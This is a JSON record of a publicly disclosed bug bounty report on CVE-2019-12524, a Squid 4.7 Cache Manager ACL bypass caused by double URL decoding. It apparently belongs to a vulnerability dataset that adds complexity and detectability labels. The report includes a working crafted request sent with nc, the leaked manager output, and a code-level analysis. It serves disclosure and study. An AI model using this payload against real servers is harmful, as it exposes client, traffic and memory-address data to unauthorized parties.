@@ -1,0 +1,48 @@
+{
+  "reported_to": "Internet Bug Bounty",
+  "reported_by": "jeriko_one ",
+  "title": "Cache Manager ACL Bypass",
+  "content": "\nSummary:\nACL Manager can be bypassed giving non authorized users to squid-internal-mgr.\nPossible to bypass other url_regex, but only focused on manager.\n<= Squid-4.7 vulnerable\nSilently Fixed in Squid-4.8\nAnnounce page was allocated, but never made http://www.squid-cache.org/Advisories/SQUID-2019_4.txt As another issue similar to this wasn't fixed\nPatch: http://www.squid-cache.org/Versions/v4/changesets/squid-4-e1e861eb9a04137fe81decd1c9370b13c6f18a18.patch\nAssigned: CVE-2019-12524\n## Steps To Reproduce:\n1) Start squid-4.7\nCode 12 Bytes\n1./sbin/squid\n2) Issue the following request replacing <hostname> with the hostname of the server running squid\nCode 125 Bytes\n1echo -e \"GET https://jeriko.one%252f@<hostname>:3128/squid-internal-mgr/active_requests HTTP/1.1\\r\\n\\r\\n\" |nc <hostname> 3128\nCode 747 Bytes\n1HTTP/1.1 200 OK\n2Server: squid/4.7\n3Mime-Version: 1.0\n4Date: Wed, 18 Mar 2020 23:41:31 GMT\n5Content-Type: text/plain;charset=utf-8\n6Expires: Wed, 18 Mar 2020 23:41:31 GMT\n7Last-Modified: Wed, 18 Mar 2020 23:41:31 GMT\n8X-Cache: MISS from g64\n9Transfer-Encoding: chunked\n10Via: 1.1 g64 (squid/4.7)\n11Connection: keep-alive\n12\n131AF\n14Connection: 0x5594f78d95f8\n15\tFD 10, read 85, wrote 0\n16\tFD desc: Reading next request\n17\tin: buf 0x5594f7d2e1a4, used 1, free 4011\n18\tremote: 192.168.4.144:38376\n19\tlocal: 192.168.4.144:3128\n20\tnrequests: 1\n21uri https://jeriko.one%2f@g64:3128/squid-internal-mgr/active_requests\n22logType TCP_MISS\n23out.offset 0, out.size 0\n24req_sz 84\n25entry 0x5594f7d2b720/0300000000000000291F000001000000\n26start 1584574891.149644 (0.000000 seconds ago)\n27username -\n28\n29\n300\nYou should have accessed the active_requests page in the squid-internal-mgr\nAnalysis\nWhen Squid is checking ACLs and it wants to check if a URL is a cache manager\nURL it checks the following rule\nCode 98 Bytes\n1 default_line(\"acl manager url_regex -i ^cache_object:// +i ^https?://[^/]+/squid-internal-mgr/\");\nWhen checking if the URL matches the regex the function\nACLUrlStrategy::match will be called. This will get the effectiveRequestUri,\ndecode it and then try to match it against the regex\nCode 275 Bytes\n1ACLUrlStrategy::match (ACLData<char const *> * &data, ACLFilledChecklist *checklist)\n2{\n3    char *esc_buf = SBufToCstring(checklist->request->effectiveRequestUri());\n4    rfc1738_unescape(esc_buf);\n5    int result = data->match(esc_buf);\n6    xfree(esc_buf);\n7    return result;\n8}\neffectiveRequestUri() will return url.absolute() for methods that aren't\nCONNECT and schemes that aren't PROTO_AUTHORITY_FORM\nLooking at Uri::absolute we see that the userInfo is included into the\nabsolute uri representation if the protocol is HTTPS\nCode 342 Bytes\n1             const bool omitUserInfo = getScheme() == AnyP::PROTO_HTTP ||\n2                                      getScheme() != AnyP::PROTO_HTTPS ||\n3                                      userInfo().isEmpty();\n4            if (!omitUserInfo) {\n5                absolute_.append(userInfo());\n6                absolute_.append(\"@\", 1);\n7            }\nuserInfo is set in Uri::parse if the foundHost contains a @ that\nthe userinfo is extracted and then decoded.\nCode 472 Bytes\n1        t = strrchr(foundHost, '@');\n2        if (t != NULL) {\n3            strncpy((char *) login, (char *) foundHost, sizeof(login)-1);\n4            login[sizeof(login)-1] = '\\0';\n5            t = strrchr(login, '@');\n6            *t = 0;\n7            strncpy((char *) foundHost, t + 1, sizeof(foundHost)-1);\n8            foundHost[sizeof(foundHost)-1] = '\\0';\n9            // Bug 4498: URL-unescape the login info after extraction\n10            rfc1738_unescape(login);\n11        }\nThis is eventually stored in userInfo when calling parseFinish\nparseFinish(protocol, proto, urlpath, foundHost, SBuf(login), foundPort);\nThis userInfo is the decoded version, therefore special tokens such as ? # /\nare possible entries in the userInfo.\nWe see now that the URL is decoded twice when checking RegexURL acls.\nLet's consider the following example URL to show how we can access\nCacheManager due to this double decode flaw.\ng64 is the name of my Squid server\nhttps://jeriko.one%252f@g64:3128/squid-internal-mgr/active_requests\nFirst in clientProcessRequest my request will be marked as internal as the\npath is /squid-internal-mgr/active_requests, and the url.host and url.port\nmatch the Squid server hostname and port number\nCode 299 Bytes\n1    if (internalCheck(request->url.path())) {\n2        if (internalHostnameIs(request->url.host()) && request->url.port() == getMyPort()) {\n3            debugs(33, 2, \"internal URL found: \" << request->url.getScheme() << \"://\" << request->url.authority(true));\n4            http->flags.internal = true;\nAs it makes it way through ACL checks it'll come against the Manager regex acl\nAfter the call rfc1738_unescape is made my URL is now\n\"https://jeriko.one/@g64:3128/squid-internal-mgr/active_requests\"\nWhich fails against the Manager regex check\nAs this decoding didn't change the original URL, when I reach internalStart my\npath will match against mgrPfx, giving me access to the cache manager.\nThe Cache manager has a lot of useful information for anyone who is curious on\nwhat type of traffic is going through a Squid server. It also provides useful\ninformation for someone trying to gain remote code execution over the server\nas the cmd active_requests holds a number of in use addresses\nImpact\nBypasses restrictions on squid-internal-mgr. This allows an attacker to gain information on Squid clients, request being made, usernames, peer servers, servers being reversed proxied, in memory objects, addresses of objects which can be used to break ASLR.\nA list can be found in stat.cc where functions are registered to the Manager.\n\n",
+  "severity": [
+    9.3,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Authentication Bypass Using an Alternate Path or Channel"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1630034880,
+  "report_url": "https://hackerone.com/reports/824203",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Start squid-4.7 with the command: ./sbin/squid"
+    ],
+    [
+      2,
+      "Issue the following request replacing <hostname> with the hostname of the server running squid: echo -e \"GET https://jeriko.one%252f@<hostname>:3128/squid-internal-mgr/active_requests HTTP/1.1\\r\\n\\r\\n\" |nc <hostname> 3128"
+    ]
+  ],
+  "vuln_description": "The vulnerability is an ACL bypass in Squid's Cache Manager that allows unauthorized users to access the squid-internal-mgr interface. This is due to a double decoding flaw in the URL processing, where the userInfo component of the URL is decoded twice, allowing special characters like '/' to bypass the ACL checks. This gives attackers access to sensitive information about Squid clients, requests, and server internals, which could be used to further exploit the system.",
+  "reason": "The vulnerability involves understanding the URL parsing and ACL checking mechanisms in Squid, including how userInfo is processed and how the double decoding flaw can be exploited. The attacker needs to craft a specific URL that leverages this flaw to bypass the ACL checks. The interaction between URL decoding and ACL matching is subtle and non-obvious, requiring deep knowledge of Squid's internals.",
+  "new_complexity": "HIGH",
+  "requires_code": true,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "idor_detectable": false,
+    "authnz_byppass_detectable": true
+  }
+}
